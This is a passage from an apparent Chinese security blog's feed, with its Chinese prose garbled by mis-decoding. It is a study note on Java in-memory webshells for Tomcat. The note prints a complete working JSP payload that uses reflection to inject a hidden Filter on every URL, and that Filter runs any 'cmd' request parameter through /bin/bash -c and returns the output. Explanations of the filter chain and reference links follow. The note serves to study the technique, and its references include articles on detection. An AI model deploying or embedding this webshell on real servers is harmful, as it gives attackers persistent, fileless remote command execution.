class="keyword">true</span>);</span><br><span class="line">StandardContext standardCtx = (StandardContext)f.get(appCtx);</span><br><span class="line"></span><br><span class="line">f = standardCtx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Map filterConfigs = (Map)f.get(standardCtx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123;</span><br><span class="line">   out.println(<span class="string">&quot;inject &quot;</span>+ name);</span><br><span class="line">   </span><br><span class="line">   Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">         HttpServletRequest req = (HttpServletRequest)arg0;</span><br><span class="line">         <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            Process p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">            <span class="keyword">int</span> len = p.getInputStream().read(data);</span><br><span class="line">            p.destroy();</span><br><span class="line">            arg1.getWriter().write(<span class="keyword">new</span> String(data, <span class="number">0</span>, len));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125; </span><br><span class="line">         arg2.doFilter(arg0, arg1);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;;</span><br><span class="line">   </span><br><span class="line">   FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">   filterDef.setFilterName(name);</span><br><span class="line">   filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">   filterDef.setFilter(filter);</span><br><span class="line">    </span><br><span class="line">   standardCtx.addFilterDef(filterDef);</span><br><span class="line">   </span><br><span class="line">   FilterMap m = <span class="keyword">new</span> FilterMap();</span><br><span class="line">   m.setFilterName(filterDef.getFilterName());</span><br><span class="line">   m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">   m.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">   </span><br><span class="line">   standardCtx.addFilterMapBefore(m);</span><br><span class="line">   </span><br><span class="line">   Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">   constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">   FilterConfig filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);</span><br><span class="line">   </span><br><span class="line">   filterConfigs.put(name, filterConfig);</span><br><span class="line">   out.println(<span class="string">&quot;injected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¶ä¸­n1ntyå¸ˆå‚…æ˜¯ä»¥jspæ–‡ä»¶æ–¹å¼ç»™å‡ºï¼Œjspè¿è¡Œè¿‡ç¨‹ä¸­ä¼šè¢«ç¼–è¯‘æˆclassï¼Œç„¶åæœ€ç»ˆäº¤ç”±servletå¤„ç†</p><p>è¿™ä¸ªpayloadä¸ºservletå†…å­˜é©¬çš„filterå‹çš„å®ç°ï¼Œä¸‹é¢è§£é‡Šå…¶åŸç†</p><h2 id="Servlet-å¿…å¤‡çŸ¥è¯†"><a href="#Servlet-å¿…å¤‡çŸ¥è¯†" class="headerlink" title="Servlet å¿…å¤‡çŸ¥è¯†"></a>Servlet å¿…å¤‡çŸ¥è¯†</h2><h3 id="Demo-Code"><a href="#Demo-Code" class="headerlink" title="Demo Code"></a>Demo Code</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œå¿…éœ€çš„åˆå§‹åŒ–</span></span><br><span class="line">        message = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">                      HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®å“åº”å†…å®¹ç±»å‹</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å®é™…çš„é€»è¾‘æ˜¯åœ¨è¿™é‡Œ</span></span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// ä»€ä¹ˆä¹Ÿä¸åš</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>Filteræ˜¯è¿‡æ»¤å™¨ï¼Œæ­£å¸¸æ˜¯åœ¨web.xmlï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒã€4ã€‘ä¸­çš„è¿‡æ»¤å™¨ä¸€èŠ‚ï¼Œæ€»ç»“å‡ ä¸ªè¦ç‚¹</p><ol><li><p>Servlet Filterè¿‡æ»¤å™¨å¯ä»¥åŠ¨æ€åœ°æ‹¦æˆªè¯·æ±‚å’Œå“åº”ï¼Œä»¥å˜æ¢æˆ–ä½¿ç”¨åŒ…å«åœ¨è¯·æ±‚æˆ–å“åº”ä¸­çš„ä¿¡æ¯ã€‚</p></li><li><p>é…ç½®ä¸­æŒ‡å®š /* ï¼Œå¯é€‚ç”¨æ‰€æœ‰servlet</p></li><li><p>web.xml ä¸­çš„ filter-mapping å…ƒç´ çš„é¡ºåºå†³å®šäº† Web å®¹å™¨åº”ç”¨è¿‡æ»¤å™¨åˆ° Servlet çš„é¡ºåºã€‚è‹¥è¦åè½¬è¿‡æ»¤å™¨çš„é¡ºåºï¼Œæ‚¨åªéœ€è¦åœ¨ web.xml æ–‡ä»¶ä¸­åè½¬ filter-mapping å…ƒç´ å³å¯ã€‚</p></li></ol><p>é—®é¢˜ï¼šé™¤äº†é™æ€é…ç½®web.xmlï¼Œå¦‚ä½•åŠ¨æ€åˆ›å»ºFilterï¼Ÿ</p><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><p>æ­£å¸¸çš„ä¸€ä¸ªServletè°ƒç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)</span><br><span class="line">at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)</span><br><span class="line">at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:198)</span><br><span class="line">at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)</span><br><span class="line">at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:493)</span><br><span class="line">at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:140)</span><br><span class="line">at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:81)</span><br><span class="line">at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)</span><br><span class="line">at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:342)</span><br><span class="line">at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:800)</span><br><span class="line">at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)</span><br><span class="line">at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:806)</span><br><span class="line">at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1498)</span><br><span class="line">at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class="line">at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)</span><br><span class="line">at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure><h2 id="Servletå†…å­˜shell"><a href="#Servletå†…å­˜shell" class="headerlink" title="Servletå†…å­˜shell"></a>Servletå†…å­˜shell</h2><h3 id="Filterå‹"><a href="#Filterå‹" class="headerlink" title="Filterå‹"></a>Filterå‹</h3><h4 id="æ¶æ„Filter"><a href="#æ¶æ„Filter" class="headerlink" title="æ¶æ„Filter"></a>æ¶æ„Filter</h4><p>ä»¥ä¸‹Filteré’ˆå¯¹æ¯ä¸ªè¯·æ±‚ï¼Œå¦‚æœå‚æ•°å¸¦cmdï¼Œåˆ™bash -cæ‰§è¡Œå…¶å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      HttpServletRequest req = (HttpServletRequest)arg0;</span><br><span class="line">      <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         Process p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">         <span class="keyword">int</span> len = p.getInputStream().read(data);</span><br><span class="line">         p.destroy();</span><br><span class="line">         arg1.getWriter().write(<span class="keyword">new</span> String(data, <span class="number">0</span>, len));</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      arg2.doFilter(arg0, arg1);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="åŠ è½½Filter"><a href="#åŠ è½½Filter" class="headerlink" title="åŠ è½½Filter"></a>åŠ è½½Filter</h4><p>n1ntyå¸ˆå‚…ä»£ç å·²ç»ç»™å‡ºäº†åŠ è½½Filterçš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»„è£… fiter ä¸ºFilterMap</span></span><br><span class="line">         FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">         filterDef.setFilterName(name);</span><br><span class="line">         filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">         filterDef.setFilter(filter);</span><br><span class="line">         FilterMap m = <span class="keyword">new</span> FilterMap();</span><br><span class="line">         m.setFilterName(filterDef.getFilterName());</span><br><span class="line">         m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">         m.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å– standardCtx</span></span><br><span class="line">         ServletContext ctx = request.getSession().getServletContext();</span><br><span class="line">         Field f = ctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">         f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         ApplicationContext appCtx = (ApplicationContext) f.get(ctx);</span><br><span class="line"></span><br><span class="line">         f = appCtx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">         f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         StandardContext standardCtx = (StandardContext) f.get(appCtx);</span><br><span class="line"></span><br><span class="line">         f = standardCtx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">         f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         Map filterConfigs = (Map) f.get(standardCtx);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"><span class="comment">// åŠ è½½FilterMap</span></span><br><span class="line">         standardCtx.addFilterDef(filterDef);</span><br><span class="line">         standardCtx.addFilterMapBefore(m);</span><br><span class="line"></span><br><span class="line">         Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">         constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         FilterConfig filterConfig = (FilterConfig) constructor.newInstance(standardCtx, filterDef);</span><br><span class="line"></span><br><span class="line">         filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åˆæ˜¯å¦‚ä½•å®šä½åˆ°çš„å‘¢ï¼Ÿ</p><p>** step1: å®˜æ–¹ServletContextè‡ªå¸¦çš„addFilter æ¥å£ **</p><p>ç±»org.apache.catalina.core.ApplicationContextFacade#addFilteræ¥å£</p><p>è°ƒç”¨org.apache.catalina.core.ApplicationContext#addFilteræ¥å£</p><p>ä½†æ˜¯ä¸è¡Œï¼Œå­˜åœ¨é™åˆ¶ï¼Œå®¹å™¨å¯åŠ¨ä¹‹åæ— æ³•è°ƒç”¨</p><p>** step2 æ‰‹åŠ¨å®ç°addFilteræ¥å£ **</p><p>è°ƒè¯•æœ€ç»ˆå®šä½åˆ°</p><p>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</p><h4 id="æ’åºFilter"><a href="#æ’åºFilter" class="headerlink" title="æ’åºFilter"></a>æ’åºFilter</h4><p>threedr3amå¸ˆå‚…æœ‰åœ¨å‚è€ƒã€6ã€‘ä¸­æåŠï¼Œtomcatå›æ˜¾æ—¶æ¶‰åŠåˆ°Filteræ’åºçš„é—®é¢˜</p><p>internalDoFilteré»˜è®¤ä¼šæ‰§è¡Œæ‰€æœ‰çš„Filterï¼Œç„¶åå†è¿›å…¥doGet/doPostæµç¨‹</p><p>Shiroæ˜¯è‡ªå®šä¹‰çš„Filterï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡é€šè¿‡è¿™ç§æ–¹å¼å–åˆ°responseå›æ˜¾ã€‚</p><p>ï¼ˆshiroçš„å¤§æ¦‚é€»è¾‘æ˜ç™½äº†ï¼Œæœ‰ç©ºè°ƒè¯•ä¸‹ï¼‰</p><p>å‰æ–‡æœ‰æåˆ°web.xmlä¸­Filterçš„æ’åºæ‰§è¡Œé—®é¢˜ï¼Œå¯¹äºåªæ˜¯tomcatå†…å­˜shellçš„è¯ï¼Œå‡ ä¹æ— å½±å“</p><p>threedr3amå¸ˆå‚…çš„TomcatShellæœ‰é»˜è®¤æŠŠevil Filteræ”¾åœ¨é¦–ä½</p><h3 id="Servletå‹"><a href="#Servletå‹" class="headerlink" title="Servletå‹"></a>Servletå‹</h3><p>å¾…è¡¥å……</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ€è€ƒé—®é¢˜</p><ol><li><p>n1ntyå¸ˆå‚…è¿˜æåˆ° â€œåŠ¨æ€æ’å…¥ Valveâ€ çš„æ–¹å¼ï¼Œå¦‚ä½•å®ç°ï¼Ÿ</p></li><li><p>phpä½œä¸ºæœ€ç«çš„è¯­è¨€ï¼Œå¯ä»¥å®ç°æ— æ–‡ä»¶webshellå—ï¼Ÿ</p></li><li><p>å¦‚ä¸Šï¼Œpythonæ¡†æ¶ï¼Œflask/djangoï¼Œuwsgiå‘¢ï¼Ÿ</p></li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat æºä»£ç è°ƒè¯•ç¬”è®° - çœ‹ä¸è§çš„ Shell</a></li><li>[2] <a href="https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ">æ‚è°ˆJavaå†…å­˜Webshellçš„æ”»ä¸é˜²</a></li><li>[3] <a href="https://www.cnblogs.com/whgk/p/6399262.html">Java Web(ä¸€) Servletè¯¦è§£ï¼ï¼</a></li><li>[4] <a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet æ•™ç¨‹</a></li><li>[5] <a href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">æŸ¥æ€Java web filterå‹å†…å­˜é©¬</a></li><li>[6] <a href="https://xz.aliyun.com/t/7388#toc-1">åŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯</a></li><li>[7] <a href="https://www.jianshu.com/p/cbe1c3174d41">åŠ¨æ€æ³¨å†Œä¹‹Servlet+Filter+Listener</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ€è¿‘åœ¨å­¦ä¹ Javaå†…å­˜shellç›¸å…³çŸ¥è¯†ï¼Œæ€»ç»“æ²‰æ·€å‡ ç¯‡æ–‡ç« ï¼Œæƒå½“å­¦ä¹ ç¬”è®°äº†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Javaå†…å­˜webshellå²&quot;&gt;&lt;a href=&quot;#Javaå†…å­˜webshellå²&quot; class=&quot;headerlink&quot; title=&quot;Javaå†…å­˜webshellå²&quot;&gt;&lt;/a&gt;Javaå†…å­˜webshellå²&lt;/h2&gt;&lt;p&gt;ç›´æ¥å¼•ç”¨c0ny1å¸ˆå‚…çš„æ€»ç»“ï¼Œå†™çš„å¤ªå¥½äº†&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;å…¶å®å†…å­˜é©¬ç”±æ¥å·²ä¹…ï¼Œæ—©åœ¨17å¹´n1ntyå¸ˆå‚…çš„ã€ŠTomcatæºç è°ƒè¯•ç¬”è®°-çœ‹ä¸è§çš„shellã€‹ä¸­å·²åˆè§ç«¯å€ªï¼Œä½†ä¸€ç›´ä¸æ¸©ä¸ç«ã€‚åç»è¿‡rebeyongå¸ˆå‚…ä½¿ç”¨agentæŠ€æœ¯åŠ æŒåï¼Œæ‹“å±•äº†å†…å­˜é©¬çš„ä½¿ç”¨åœºæ™¯ï¼Œç„¶ç»ˆåœç•™åœ¨å¥‡æŠ€æ·«å·§ä¸Šã€‚åœ¨å„ç±»hwæ´—ç¤¼ä¹‹åï¼Œæ–‡ä»¶shellæ˜æ˜¾æ°”æ•°å·²å°½ã€‚å†…å­˜é©¬ä»¥æ•‘å‘½ç¨»è‰çš„èº«ä»½é‡å›å¤§ä¼—è§†é‡ã€‚ç‰¹åˆ«æ˜¯ä»Šå¹´åœ¨shiroçš„å›æ˜¾ç ”ç©¶ä¹‹åï¼Œå¼•å‘äº†æ— æ•°å®‰å…¨ç ”ç©¶å‘˜å¯¹å†…å­˜webshellçš„ç ”ç©¶ï¼Œå…¶ä¸­æ¶Œç°å‡ºäº†LandGreyå¸ˆå‚…æ„é€ çš„Spring controllerå†…å­˜é©¬ã€‚è‡³æ­¤å†…å­˜é©¬å¼€ææ•£å¶å‘å±•å‡ºäº†ä¸‰å¤§ç±»å‹ï¼š&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1. servlet-apiç±»&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	filterå‹&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	servletå‹&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. springç±»&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	æ‹¦æˆªå™¨&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	controllerå‹&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. Java Instrumentationç±»&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	agentå‹&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;å†…å­˜é©¬è¿™å›æ·±å··ä½³é…’ï¼Œä¸€æ—¶é—´æµè¡Œäºå¸‚äº•ä¸å¼„å ‚ä¹‹é—´ã€‚ä¸Šè‡³å®‰å…¨ç ”ç©¶å‘˜ä¸‹è‡³æ™®é€šå®¢æˆ·ï¼Œäººå°½çš†çŸ¥ã€‚æ­£å€¼hwæ¥ä¸´ä¹‹é™…ï¼Œä¸éš¾æ¨æµ‹å±Šæ—¶å¿…å°†æ˜¯å†…å­˜é©¬æ¨ªè¡Œå¤©ä¸‹ä¹‹æ—¥ã€‚è€Œå„å¤§å®‰å…¨å‚å•†å´è¿Ÿè¿Ÿæœªè§åŠ¨é™ã€‚æ‰€è°“è¡¨é¢é£å¹³æµªé™ï¼Œå®åˆ™æš—æµæ¶ŒåŠ¨ã€‚æˆ–è®¸ä¸€åœºå†…å­˜é©¬çš„å›´å‰¿è®¡åˆ’æ­£æ…¢æ…¢å±•å¼€ã€‚ä½œä¸ºæ”»å‡»æ–¹å‘çš„ç ”ç©¶äººå‘˜ï¼Œæ²¡æœ‰å¯¹æ‰‹å°±åˆ¶é€ å¯¹æ‰‹,æ”»é˜²äº’æ¢æ‰èƒ½æå‡å†…å­˜é©¬æŠ€æœ¯çš„å‘å±•ã€‚&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="å†…å­˜é©¬" scheme="http://m0d9.me/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="shell" scheme="http://m0d9.me/tags/shell/"/>
    
    <category term="servlet" scheme="http://m0d9.me/tags/servlet/"/>
    
  </entry>
  
  <entry>
    <title>ysoserialå·¥å…·åˆ†æï¼šTemplatesImplé“¾ä¸ä»£ç æ‰§è¡Œ</title>
    <link href="http://m0d9.me/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://m0d9.me/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2020-09-25T02:20:00.000Z</published>
    <updated>2021-12-27T07:14:13.309Z</updated>
    
